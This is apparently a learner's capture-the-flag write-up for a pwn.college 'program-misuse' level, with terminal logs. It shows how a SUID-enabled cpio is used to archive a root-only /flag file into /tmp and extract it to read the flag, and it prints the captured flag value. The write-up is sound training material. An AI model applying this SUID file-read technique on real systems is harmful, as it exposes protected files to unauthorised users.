`cpio` ah! a headache. man I tried it to solve for almost one day. This I think is one of the `not so easy` challenge in the `program-misuse` module. At last, I solved it. Many ideas to solve it was found in the `pwn.college` discord server. You can search there `cpio` and can check many insightful chat about this problem.
Thanks to those who wrote them.

Now the writeup.

`yes because when you put /flag in. <>, it tries to read flag which is not allowed`

```bash
hacker@program-misuse-level-22:~$ cd /
hacker@program-misuse-level-22:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-22:/$ cd challenge/
hacker@program-misuse-level-22:/challenge$ ls
babysuid_level22
hacker@program-misuse-level-22:/challenge$ ./babysuid_level22 
Welcome to ./babysuid_level22!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/cpio.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level22) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cpio!
hacker@program-misuse-level-22:/challenge$ cd /
hacker@program-misuse-level-22:/$ cpio -ov < flag > flag.cpio
bash: flag: Permission denied
hacker@program-misuse-level-22:/$ cpio -ov < /flag > flag.cpio
bash: /flag: Permission denied
hacker@program-misuse-level-22:/$ find flag | cpio -ov > flag.cpio
bash: flag.cpio: Permission denied
hacker@program-misuse-level-22:/$ find flag | cpio -ov > /tmp/flag.cpio
flag
1 block
hacker@program-misuse-level-22:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-22:/$ cd /tmp/
hacker@program-misuse-level-22:/tmp$ ls
flag.cpio  hsperfdata_root  ssh-3exY2OlE3u9r  vscode-ipc-10657d9b-ae27-4fd7-913b-c1089b3e2a93.sock  vscode-ipc-99e00527-9f73-4902-bead-58cc2dae025d.sock
hacker@program-misuse-level-22:/tmp$ cpio -iv flag.cpio 
^C
hacker@program-misuse-level-22:/tmp$ cpio -iv --to-stdout flag.cpio 
^C
hacker@program-misuse-level-22:/tmp$ cpio --to-stdout flag.cpio 
cpio: You must specify one of -oipt options.
Try 'cpio --help' or 'cpio --usage' for more information.
hacker@program-misuse-level-22:/tmp$ cpio -i --to-stdout < flag.cpio 
pwn.college{sp1LT24UoH2edTSmdPEx_w6WtCV.0FN2EDL0AjNzQzW}
1 block
```


Here you can see, when we run `cpio -ov < flag > flag.cpio` , it tries to read the `flag` file. But it has no read permission to user. So,

```bash
hacker@program-misuse-level-22:/$ cpio -ov < flag > flag.cpio
bash: flag: Permission denied
```

this shows in the terminal.

If you read the `man` page of `cpio`, you will see

`When creating an archive, cpio takes the list of files to be processed from the standard input, and then sends the archive to the standard output. Usually find or ls is used to provide this list to the standard input.`

So I ran

`hacker@program-misuse-level-22:/$ find flag | cpio -ov > flag.cpio`

`-o` is for creating the archive.
`-v` verbosely list the files processed

But this time it shows, `bash: flag.cpio: Permission denied` , it means that you can't create any file in the root directory. So there are generally two places you can use to store the archive file.

1. `/home/hacker: home directory.`
2. `/tmp: temp directory`

here we use the `/tmp` directory.

```bash
hacker@program-misuse-level-22:/$ find flag | cpio -ov > /tmp/flag.cpio
flag
1 block
```

> [!Meaning of -v: verbosely]
> `when something is done verbosely, it is done in a detailed and comprehensive manner. Here when you can see the output "flag" and then "1 block". If you don't write -v it will just print the "1 block"`

This successfully archives the `flag` file.

Now we have to extract the `flag.cpio` and prints it content.

If you read the `man` page again, you will see to extract we have to use `-i` and to print the contents
`--to-stdout` which says `Extract files to standard output`

After trying some combination of the commands, I found the correct one.

```bash
hacker@program-misuse-level-22:/tmp$ cpio -i --to-stdout < flag.cpio 
pwn.college{sp1LT24UoH2edTSmdPEx_w6WtCV.0FN2EDL0AjNzQzW}
1 block
```

**And BANG! you found the FLAG!**
